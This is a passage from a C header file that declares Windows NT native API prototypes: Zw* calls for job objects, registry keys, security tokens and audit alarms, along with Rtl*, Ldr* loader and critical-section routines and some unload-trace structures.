ZwTestAlert (
    VOID
    );



NTSTATUS
NTAPI
ZwRegisterThreadTerminatePort (
    IN HANDLE PortHandle
    );



NTSTATUS
NTAPI
ZwSetLdtEntries (
    IN ULONG Selector0,
    IN ULONG Entry0Low,
    IN ULONG Entry0Hi,
    IN ULONG Selector1,
    IN ULONG Entry1Low,
    IN ULONG Entry1Hi
    );



NTSTATUS
NTAPI
ZwQueueApcThread (
    IN HANDLE ThreadHandle,
    IN PPS_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcArgument1,
    IN OPTIONAL PVOID ApcArgument2,
    IN OPTIONAL PVOID ApcArgument3
    );



NTSTATUS
NTAPI
ZwCreateJobObject (
    OUT PHANDLE JobHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwOpenJobObject (
    OUT PHANDLE JobHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwAssignProcessToJobObject (
    IN HANDLE JobHandle,
    IN HANDLE ProcessHandle
    );



NTSTATUS
NTAPI
ZwTerminateJobObject (
    IN HANDLE JobHandle,
    IN NTSTATUS ExitStatus
    );



NTSTATUS
NTAPI
ZwIsProcessInJob (
    IN HANDLE ProcessHandle,
    IN OPTIONAL HANDLE JobHandle
    );



NTSTATUS
NTAPI
ZwCreateJobSet (
    IN ULONG NumJob,
    IN PJOB_SET_ARRAY UserJobSet,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwQueryInformationJobObject (
    IN OPTIONAL HANDLE JobHandle,
    IN JOBOBJECTINFOCLASS JobObjectInformationClass,
    OUT PVOID JobObjectInformation,
    IN ULONG JobObjectInformationLength,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetInformationJobObject (
    IN HANDLE JobHandle,
    IN JOBOBJECTINFOCLASS JobObjectInformationClass,
    IN PVOID JobObjectInformation,
    IN ULONG JobObjectInformationLength
    );



NTSTATUS
NTAPI
ZwCreateKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    ULONG TitleIndex,
    IN OPTIONAL PUNICODE_STRING Class,
    IN ULONG CreateOptions,
    OUT OPTIONAL PULONG Disposition
    );



NTSTATUS
NTAPI
ZwDeleteKey(
    IN HANDLE KeyHandle
    );



NTSTATUS
NTAPI
ZwDeleteValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName
    );



NTSTATUS
NTAPI
ZwEnumerateKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT OPTIONAL PVOID KeyInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );



NTSTATUS
NTAPI
ZwEnumerateValueKey(
    IN HANDLE KeyHandle,
    IN ULONG Index,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT OPTIONAL PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );



NTSTATUS
NTAPI
ZwFlushKey(
    IN HANDLE KeyHandle
    );



NTSTATUS
NTAPI
ZwInitializeRegistry(
    IN USHORT BootCondition
    );



NTSTATUS
NTAPI
ZwNotifyChangeKey(
    IN HANDLE KeyHandle,
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree,
    OUT OPTIONAL PVOID Buffer,
    IN ULONG BufferSize,
    IN BOOLEAN Asynchronous
    );



NTSTATUS
NTAPI
ZwNotifyChangeMultipleKeys(
    IN HANDLE MasterKeyHandle,
    IN OPTIONAL ULONG Count,
    IN OPTIONAL OBJECT_ATTRIBUTES SlaveObjects[],
    IN OPTIONAL HANDLE Event,
    IN OPTIONAL PIO_APC_ROUTINE ApcRoutine,
    IN OPTIONAL PVOID ApcContext,
    OUT PIO_STATUS_BLOCK IoStatusBlock,
    IN ULONG CompletionFilter,
    IN BOOLEAN WatchTree,
    OUT OPTIONAL PVOID Buffer,
    IN ULONG BufferSize,
    IN BOOLEAN Asynchronous
    );



NTSTATUS
NTAPI
ZwLoadKey(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile
    );



NTSTATUS
NTAPI
ZwLoadKey2(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwLoadKeyEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN POBJECT_ATTRIBUTES SourceFile,
    IN ULONG Flags,
    IN OPTIONAL HANDLE TrustClassKey
    );



NTSTATUS
NTAPI
ZwOpenKey(
    OUT PHANDLE KeyHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes
    );



NTSTATUS
NTAPI
ZwQueryKey(
    IN HANDLE KeyHandle,
    IN KEY_INFORMATION_CLASS KeyInformationClass,
    OUT OPTIONAL PVOID KeyInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );



NTSTATUS
NTAPI
ZwQueryValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN KEY_VALUE_INFORMATION_CLASS KeyValueInformationClass,
    OUT OPTIONAL PVOID KeyValueInformation,
    IN ULONG Length,
    OUT PULONG ResultLength
    );



NTSTATUS
NTAPI
ZwQueryMultipleValueKey(
    IN HANDLE KeyHandle,
    IN OUT PKEY_VALUE_ENTRY ValueEntries,
    IN ULONG EntryCount,
    OUT PVOID ValueBuffer,
    IN OUT PULONG BufferLength,
    OUT OPTIONAL PULONG RequiredBufferLength
    );



NTSTATUS
NTAPI
ZwReplaceKey(
    IN POBJECT_ATTRIBUTES NewFile,
    IN HANDLE TargetHandle,
    IN POBJECT_ATTRIBUTES OldFile
    );



NTSTATUS
NTAPI
ZwRenameKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING  NewName
    );



NTSTATUS
NTAPI
ZwCompactKeys(
    IN ULONG Count,
    IN HANDLE KeyArray[]
            );



NTSTATUS
NTAPI
ZwCompressKey(
    IN HANDLE Key
            );



NTSTATUS
NTAPI
ZwRestoreKey(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwSaveKey(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle
    );



NTSTATUS
NTAPI
ZwSaveKeyEx(
    IN HANDLE KeyHandle,
    IN HANDLE FileHandle,
    IN ULONG  Format
    );



NTSTATUS
NTAPI
ZwSaveMergedKeys(
    IN HANDLE HighPrecedenceKeyHandle,
    IN HANDLE LowPrecedenceKeyHandle,
    IN HANDLE FileHandle
    );



NTSTATUS
NTAPI
ZwSetValueKey(
    IN HANDLE KeyHandle,
    IN PUNICODE_STRING ValueName,
    IN OPTIONAL ULONG TitleIndex,
    IN ULONG Type,
    IN OPTIONAL PVOID Data,
    IN ULONG DataSize
    );



NTSTATUS
NTAPI
ZwUnloadKey(
    IN POBJECT_ATTRIBUTES TargetKey
    );



NTSTATUS
NTAPI
ZwUnloadKey2(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN ULONG Flags
    );



NTSTATUS
NTAPI
ZwUnloadKeyEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN OPTIONAL HANDLE Event
    );



NTSTATUS
NTAPI
ZwSetInformationKey(
    IN HANDLE KeyHandle,
    IN KEY_SET_INFORMATION_CLASS KeySetInformationClass,
    IN PVOID KeySetInformation,
    IN ULONG KeySetInformationLength
    );



NTSTATUS
NTAPI
ZwQueryOpenSubKeys(
    IN POBJECT_ATTRIBUTES TargetKey,
    OUT PULONG  HandleCount
    );



NTSTATUS
NTAPI
ZwQueryOpenSubKeysEx(
    IN POBJECT_ATTRIBUTES TargetKey,
    IN ULONG BufferLength,
    OUT PVOID Buffer,
    OUT PULONG RequiredSize
    );



NTSTATUS
NTAPI
ZwLockRegistryKey(
    IN HANDLE KeyHandle
    );



NTSTATUS
NTAPI
ZwLockProductActivationKeys(
    IN OUT OPTIONAL ULONG *pPrivateVer,
    OUT OPTIONAL ULONG *pSafeMode
    );



NTSTATUS
NTAPI
ZwAccessCheck (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );



NTSTATUS
NTAPI
ZwAccessCheckByType (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );



NTSTATUS
NTAPI
ZwAccessCheckByTypeResultList (
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    OUT PPRIVILEGE_SET PrivilegeSet,
    IN OUT  PULONG PrivilegeSetLength,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus
    );



NTSTATUS
NTAPI
ZwCreateToken(
    OUT PHANDLE TokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN OPTIONAL POBJECT_ATTRIBUTES ObjectAttributes,
    IN TOKEN_TYPE TokenType,
    IN PLUID AuthenticationId,
    IN PLARGE_INTEGER ExpirationTime,
    IN PTOKEN_USER User,
    IN PTOKEN_GROUPS Groups,
    IN PTOKEN_PRIVILEGES Privileges,
    IN OPTIONAL PTOKEN_OWNER Owner,
    IN PTOKEN_PRIMARY_GROUP PrimaryGroup,
    IN OPTIONAL PTOKEN_DEFAULT_DACL DefaultDacl,
    IN PTOKEN_SOURCE TokenSource
    );



NTSTATUS
NTAPI
ZwCompareTokens(
    IN HANDLE FirstTokenHandle,
    IN HANDLE SecondTokenHandle,
    OUT PBOOLEAN Equal
    );



NTSTATUS
NTAPI
ZwOpenThreadToken(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    OUT PHANDLE TokenHandle
    );



NTSTATUS
NTAPI
ZwOpenThreadTokenEx(
    IN HANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN BOOLEAN OpenAsSelf,
    IN ULONG HandleAttributes,
    OUT PHANDLE TokenHandle
    );



NTSTATUS
NTAPI
ZwOpenProcessToken(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    OUT PHANDLE TokenHandle
    );



NTSTATUS
NTAPI
ZwOpenProcessTokenEx(
    IN HANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN ULONG HandleAttributes,
    OUT PHANDLE TokenHandle
    );



NTSTATUS
NTAPI
ZwDuplicateToken(
    IN HANDLE ExistingTokenHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN BOOLEAN EffectiveOnly,
    IN TOKEN_TYPE TokenType,
    OUT PHANDLE NewTokenHandle
    );



NTSTATUS
NTAPI
ZwFilterToken (
    IN HANDLE ExistingTokenHandle,
    IN ULONG Flags,
    IN OPTIONAL PTOKEN_GROUPS SidsToDisable,
    IN OPTIONAL PTOKEN_PRIVILEGES PrivilegesToDelete,
    IN OPTIONAL PTOKEN_GROUPS RestrictedSids,
    OUT PHANDLE NewTokenHandle
    );



NTSTATUS
NTAPI
ZwImpersonateAnonymousToken(
    IN HANDLE ThreadHandle
    );



NTSTATUS
NTAPI
ZwQueryInformationToken (
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    OUT PVOID TokenInformation,
    IN ULONG TokenInformationLength,
    OUT PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwSetInformationToken (
    IN HANDLE TokenHandle,
    IN TOKEN_INFORMATION_CLASS TokenInformationClass,
    IN PVOID TokenInformation,
    IN ULONG TokenInformationLength
    );



NTSTATUS
NTAPI
ZwAdjustPrivilegesToken (
    IN HANDLE TokenHandle,
    IN BOOLEAN DisableAllPrivileges,
    IN OPTIONAL PTOKEN_PRIVILEGES NewState,
    IN OPTIONAL ULONG BufferLength,
    OUT PTOKEN_PRIVILEGES PreviousState,
    OUT OPTIONAL PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwAdjustGroupsToken (
    IN HANDLE TokenHandle,
    IN BOOLEAN ResetToDefault,
    IN PTOKEN_GROUPS NewState ,
    IN OPTIONAL ULONG BufferLength ,
    OUT PTOKEN_GROUPS PreviousState ,
    OUT PULONG ReturnLength
    );



NTSTATUS
NTAPI
ZwPrivilegeCheck (
    IN HANDLE ClientToken,
    IN OUT  PPRIVILEGE_SET RequiredPrivileges,
    OUT PBOOLEAN Result
    );



NTSTATUS
NTAPI
ZwAccessCheckAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN ACCESS_MASK DesiredAccess,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );



NTSTATUS
NTAPI
ZwAccessCheckByTypeAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );



NTSTATUS
NTAPI
ZwAccessCheckByTypeResultListAndAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );



NTSTATUS
NTAPI
ZwAccessCheckByTypeResultListAndAuditAlarmByHandle (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN HANDLE ClientToken,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN OPTIONAL PSID PrincipalSelfSid,
    IN ACCESS_MASK DesiredAccess,
    IN AUDIT_EVENT_TYPE AuditType,
    IN ULONG Flags,
    IN POBJECT_TYPE_LIST ObjectTypeList,
    IN ULONG ObjectTypeListLength,
    IN PGENERIC_MAPPING GenericMapping,
    IN BOOLEAN ObjectCreation,
    OUT PACCESS_MASK GrantedAccess,
    OUT PNTSTATUS AccessStatus,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
ZwOpenObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN PUNICODE_STRING ObjectTypeName,
    IN PUNICODE_STRING ObjectName,
    IN OPTIONAL PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN ACCESS_MASK GrantedAccess,
    IN OPTIONAL PPRIVILEGE_SET Privileges,
    IN BOOLEAN ObjectCreation,
    IN BOOLEAN AccessGranted,
    OUT PBOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
ZwPrivilegeObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN HANDLE ClientToken,
    IN ACCESS_MASK DesiredAccess,
    IN PPRIVILEGE_SET Privileges,
    IN BOOLEAN AccessGranted
    );


NTSTATUS
NTAPI
ZwCloseObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN BOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
ZwDeleteObjectAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN OPTIONAL PVOID HandleId,
    IN BOOLEAN GenerateOnClose
    );


NTSTATUS
NTAPI
ZwPrivilegedServiceAuditAlarm (
    IN PUNICODE_STRING SubsystemName,
    IN PUNICODE_STRING ServiceName,
    IN HANDLE ClientToken,
    IN PPRIVILEGE_SET Privileges,
    IN BOOLEAN AccessGranted
    );


NTSTATUS
NTAPI
ZwContinue (
    IN PCONTEXT ContextRecord,
    IN BOOLEAN TestAlert
    );


NTSTATUS
NTAPI
ZwRaiseException (
    IN PEXCEPTION_RECORD ExceptionRecord,
    IN PCONTEXT ContextRecord,
    IN BOOLEAN FirstChance
    );

// end_zwapi

ULONG
DbgPrint(
	IN PCH Format,
	...
	);

VOID NTAPI
DebugService2 (
    PVOID Arg1,
    PVOID Arg2,
    ULONG Service
    );


__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerAdd (
    LARGE_INTEGER Addend1,
    LARGE_INTEGER Addend2
    );

__inline
LARGE_INTEGER
NTAPI
RtlEnlargedIntegerMultiply (
    LONG Multiplicand,
    LONG Multiplier
    );

__inline
LARGE_INTEGER
NTAPI
RtlEnlargedUnsignedMultiply (
    ULONG Multiplicand,
    ULONG Multiplier
    );

__inline
ULONG
NTAPI
RtlEnlargedUnsignedDivide (
    IN ULARGE_INTEGER Dividend,
    IN ULONG Divisor,
    IN PULONG Remainder OPTIONAL
    );

__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerNegate (
    LARGE_INTEGER Subtrahend
    );

__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerSubtract (
    LARGE_INTEGER Minuend,
    LARGE_INTEGER Subtrahend
    );

LARGE_INTEGER
NTAPI
RtlExtendedMagicDivide (
    LARGE_INTEGER Dividend,
    LARGE_INTEGER MagicDivisor,
    CCHAR ShiftCount
    );

LARGE_INTEGER
NTAPI
RtlExtendedLargeIntegerDivide (
    LARGE_INTEGER Dividend,
    ULONG Divisor,
    PULONG Remainder
    );

LARGE_INTEGER
NTAPI
RtlLargeIntegerDivide (
    LARGE_INTEGER Dividend,
    LARGE_INTEGER Divisor,
    PLARGE_INTEGER Remainder
    );

LARGE_INTEGER
NTAPI
RtlExtendedIntegerMultiply (
    LARGE_INTEGER Multiplicand,
    LONG Multiplier
    );

__inline
LARGE_INTEGER
NTAPI
RtlConvertLongToLargeInteger (
    LONG SignedInteger
    );


__inline
LARGE_INTEGER
NTAPI
RtlConvertUlongToLargeInteger (
    ULONG UnsignedInteger
    );

__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerShiftLeft (
    LARGE_INTEGER LargeInteger,
    CCHAR ShiftCount
    );

__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerShiftRight (
    LARGE_INTEGER LargeInteger,
    CCHAR ShiftCount
    );


__inline
LARGE_INTEGER
NTAPI
RtlLargeIntegerArithmeticShift (
    LARGE_INTEGER LargeInteger,
    CCHAR ShiftCount
    );


__inline
BOOLEAN
NTAPI
RtlCheckBit (
    PRTL_BITMAP BitMapHeader,
    ULONG BitPosition
    );


BOOLEAN
NTAPI
RtlIsValidOemCharacter (
    IN OUT PWCHAR Char
    );

PIMAGE_NT_HEADERS
NTAPI
RtlpImageNtHeader(
    PVOID Base
    );

RTL_PATH_TYPE
RtlDetermineDosPathNameType_U(
	IN PCWSTR DosFileName
	);

PRTL_TRACE_DATABASE
RtlTraceDatabaseCreate (
    IN ULONG Buckets,
    IN SIZE_T MaximumSize OPTIONAL,
    IN ULONG Flags, // OPTIONAL in User mode
    IN ULONG Tag,   // OPTIONAL in User mode
    IN RTL_TRACE_HASH_FUNCTION HashFunction OPTIONAL
    );

BOOLEAN
RtlTraceDatabaseValidate (
    IN PRTL_TRACE_DATABASE Database
    );

BOOLEAN
RtlTraceDatabaseAdd (
    IN PRTL_TRACE_DATABASE Database,
    IN ULONG Count,
    IN PVOID * Trace,
    OUT PRTL_TRACE_BLOCK * TraceBlock OPTIONAL
    );

BOOLEAN
RtlTraceDatabaseFind (
    PRTL_TRACE_DATABASE Database,
    IN ULONG Count,
    IN PVOID * Trace,
    OUT PRTL_TRACE_BLOCK * TraceBlock OPTIONAL
    );

BOOLEAN
RtlTraceDatabaseEnumerate (
    PRTL_TRACE_DATABASE Database,
    OUT PRTL_TRACE_ENUMERATE Enumerate,
    OUT PRTL_TRACE_BLOCK * TraceBlock
    );

VOID
RtlTraceDatabaseLock (
    IN PRTL_TRACE_DATABASE Database
    );

VOID
RtlTraceDatabaseUnlock (
    IN PRTL_TRACE_DATABASE Database
    );

VOID
RtlpGetStackLimits (
    OUT PULONG_PTR LowLimit,
    OUT PULONG_PTR HighLimit
    );

NTSTATUS
NTAPI
RtlEnterCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

NTSTATUS
NTAPI
RtlLeaveCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

LOGICAL
NTAPI
RtlIsCriticalSectionLocked (
    IN PRTL_CRITICAL_SECTION CriticalSection
    );

LOGICAL
NTAPI
RtlIsCriticalSectionLockedByThread (
    IN PRTL_CRITICAL_SECTION CriticalSection
    );

ULONG
NTAPI
RtlGetCriticalSectionRecursionCount (
    IN PRTL_CRITICAL_SECTION CriticalSection
    );

LOGICAL
NTAPI
RtlTryEnterCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

NTSTATUS
NTAPI
RtlInitializeCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

VOID
NTAPI
RtlEnableEarlyCriticalSectionEventCreation(
    VOID
    );

NTSTATUS
NTAPI
RtlInitializeCriticalSectionAndSpinCount(
    PRTL_CRITICAL_SECTION CriticalSection,
    ULONG SpinCount
    );

ULONG
NTAPI
RtlSetCriticalSectionSpinCount(
    PRTL_CRITICAL_SECTION CriticalSection,
    ULONG SpinCount
    );

NTSTATUS
NTAPI
RtlDeleteCriticalSection(
    PRTL_CRITICAL_SECTION CriticalSection
    );

NTSTATUS
NTAPI
LdrDisableThreadCalloutsForDll (
    IN PVOID DllHandle
    );

NTSTATUS
NTAPI
LdrLoadDll(
	IN OPTIONAL PWSTR DllPath,
	IN OPTIONAL PULONG DllCharacteristics,
	IN PUNICODE_STRING DllName,
	OUT PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrUnloadDll(
	IN PVOID DllHandle
	);

NTSTATUS
NTAPI
LdrGetDllHandle(
	IN OPTIONAL PWSTR DllPath,
	IN OPTIONAL PULONG DllCharacteristics,
	IN PUNICODE_STRING DllName,
	OUT PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrGetDllHandleEx(
	IN ULONG Flags,
	IN OPTIONAL PCWSTR DllPath,
	IN OPTIONAL PULONG DllCharacteristics,
	IN PUNICODE_STRING DllName,
	OUT OPTIONAL PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrGetDllHandleByMapping(
	IN PVOID Base,
	OUT PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrGetDllHandleByName(
	IN OPTIONAL PUNICODE_STRING BaseDllName,
	IN OPTIONAL PUNICODE_STRING FullDllName,
	OUT PVOID *DllHandle
	);

NTSTATUS
NTAPI
LdrAddRefDll(
	IN ULONG Flags,
	IN PVOID DllHandle
	);

NTSTATUS
NTAPI
LdrGetProcedureAddress(
	IN PVOID DllHandle,
	IN OPTIONAL PANSI_STRING ProcedureName,
	IN OPTIONAL ULONG ProcedureNumber,
	OUT PVOID *ProcedureAddress
	);

NTSTATUS
NTAPI
LdrGetProcedureAddressEx(
	IN PVOID DllHandle,
	IN OPTIONAL PANSI_STRING ProcedureName,
	IN OPTIONAL ULONG ProcedureNumber,
	OUT PVOID *ProcedureAddress,
	IN ULONG Flags
	);

NTSTATUS
NTAPI
LdrLockLoaderLock(
	IN ULONG Flags,
	OUT OPTIONAL ULONG *Disposition,
	OUT PVOID *Cookie
	);

NTSTATUS
NTAPI
LdrRelocateImage(
	IN PVOID NewBase,
	IN PSTR LoaderName,
	IN NTSTATUS Success,
	IN NTSTATUS Conflict,
	IN NTSTATUS Invalid
	);

NTSTATUS
NTAPI
LdrRelocateImageWithBias(
	IN PVOID NewBase,
	IN LONGLONG Bias,
	IN PSTR LoaderName,
	IN NTSTATUS Success,
	IN NTSTATUS Conflict,
	IN NTSTATUS Invalid
	);

PIMAGE_BASE_RELOCATION
NTAPI
LdrProcessRelocationBlock(
	IN ULONG_PTR VA,
	IN ULONG SizeOfBlock,
	IN PUSHORT NextOffset,
	IN LONG_PTR Diff
	);

BOOLEAN
NTAPI
LdrVerifyMappedImageMatchesChecksum(
	IN PVOID BaseAddress,
	IN SIZE_T NumberOfBytes,
	IN ULONG FileLength
	);

NTSTATUS
NTAPI
LdrQueryModuleServiceTags(
	IN PVOID DllHandle,
	OUT PULONG ServiceTagBuffer,
	IN OUT PULONG BufferSize
	);

NTSTATUS
NTAPI
LdrRegisterDllNotification(
	IN ULONG Flags,
	IN PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
	IN PVOID Context,
	OUT PVOID *Cookie
	);

NTSTATUS
NTAPI
LdrUnregisterDllNotification(
	IN PVOID Cookie
	);

ULONG
NTAPI
CsrGetProcessId(
	);

void
NTAPI
A_SHAFinal(
	PSHA_CTX Context,
	PULONG Result
	);


PVOID
NTAPI
A_SHAUpdate(
	IN OUT PSHA_CTX,
	IN PCHAR,
	IN UINT
	);

PVOID
NTAPI
A_SHAInit(
	IN OUT PSHA_CTX,
	OUT PVOID
	);

BOOLEAN
NTAPI
RtlDosPathNameToNtPathName_U(
    IN PCWSTR DosFileName,
    OUT PUNICODE_STRING NtFileName,
    OUT PWSTR *FilePart OPTIONAL,
    PVOID Reserved
    );

NTSTATUS
NTAPI
RtlDosPathNameToNtPathName_U_WithStatus(
    IN PCWSTR DosFileName,
    OUT PUNICODE_STRING NtFileName,
    OUT PWSTR *FilePart OPTIONAL,
    PVOID Reserved // Must be NULL
	);

PVOID
NTAPI
RtlAddVectoredExceptionHandler (
    IN ULONG First,
    IN PVECTORED_EXCEPTION_HANDLER Handler
    );

PVOID
NTAPI
RtlAddVectoredContinueHandler (
    IN ULONG First,
    IN PVECTORED_EXCEPTION_HANDLER Handler
    );

NTSTATUS
NTAPI
RtlAnalyzeProfile (
    VOID
    );

BOOLEAN
NTAPI
RtlCallVectoredContinueHandlers (
    IN PEXCEPTION_RECORD ExceptionRecord,
    IN PCONTEXT ContextRecord
    );

PVOID
RtlEncodePointer(
     PVOID Ptr
     );

PVOID
RtlDecodePointer(
     PVOID Ptr
     );

PVOID
RtlEncodeSystemPointer(
     PVOID Ptr
     );

PVOID
RtlDecodeSystemPointer(
     PVOID Ptr
     );

VOID
NTAPI
RtlDeleteResource(
    PRTL_RESOURCE Resource
    );

NTSTATUS
NTAPI
RtlDeleteSecurityObject(
    PSECURITY_DESCRIPTOR * ObjectDescriptor
    );

BOOLEAN
RtlDllShutdownInProgress(
    VOID
    );

ULONG
NTAPI
RtlGetCurrentProcessorNumber (
    VOID
    );

#define RTL_UNLOAD_EVENT_TRACE_NUMBER 16

typedef struct _RTL_UNLOAD_EVENT_TRACE {
    PVOID BaseAddress;   // Base address of dll
    SIZE_T SizeOfImage;  // Size of image
    ULONG Sequence;      // Sequence number for this event
    ULONG TimeDateStamp; // Time and date of image
    ULONG CheckSum;      // Image checksum
    WCHAR ImageName[32]; // Image name
} RTL_UNLOAD_EVENT_TRACE, *PRTL_UNLOAD_EVENT_TRACE;

typedef struct _RTL_UNLOAD_EVENT_TRACE64 {
    ULONGLONG BaseAddress;   // Base address of dll
    ULONGLONG SizeOfImage;  // Size of image
    ULONG Sequence;      // Sequence number for this event
    ULONG TimeDateStamp; // Time and date of image
    ULONG CheckSum;      // Image checksum
    WCHAR ImageName[32]; // Image name
} RTL_UNLOAD_EVENT_TRACE64, *PRTL_UNLOAD_EVENT_TRACE64;

typedef struct _RTL_UNLOAD_EVENT_TRACE32 {
    ULONG BaseAddress;   // Base address of dll
    ULONG SizeOfImage;  // Size of image
